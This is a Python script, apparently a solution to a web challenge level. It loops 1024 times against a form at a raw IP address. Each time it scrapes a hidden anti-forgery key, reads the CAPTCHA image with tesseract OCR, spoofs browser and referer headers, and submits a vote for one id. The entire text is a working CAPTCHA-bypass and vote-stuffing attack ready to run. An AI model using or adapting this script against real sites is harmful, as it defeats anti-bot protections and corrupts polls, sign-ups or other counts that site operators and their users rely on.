#!/usr/bin/python3

import requests
import os
from bs4 import BeautifulSoup


def o_read():
    with open("/tmp/cap.txt") as f:
        texto = f.read(4).replace('\n', '')
        f.close
        return(texto)


def o_write(content):
    with open("/tmp/capt.png", "wb") as f:
        f.write(content)
        f.close


def get_cap():
    exec('import subprocess; subprocess.call\
        (["tesseract","/tmp/capt.png", "/tmp/cap"])')


data_form = {"id": "3819", "holdthedoor": "Submit", "key": "", "captcha": ""}
tuheader = {"user-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0)\
            Gecko/20100101 Firefox/47.0",
            "referer": "http://158.69.76.135/level3.php"}

if __name__ == "__main__":
    i = 0
    while (i != 1024):
        new_session = requests.session()
        html = new_session.get("http://158.69.76.135/level3.php")
        token = BeautifulSoup(html.text, "html.parser")

        hidden_key = token.find("form", {"method": "post"})
        hidden_key = hidden_key.find("input", {"type": "hidden"})
        data_form["key"] = hidden_key["value"]

        o_write(new_session.get("http://158.69.76.135/captcha.php").content)
        get_cap()
        os.remove("/tmp/capt.png")
        data_form["captcha"] = o_read()
        new_session.post("http://158.69.76.135/level3.php",
                        data=data_form, headers=tuheader)
        i = i + 1

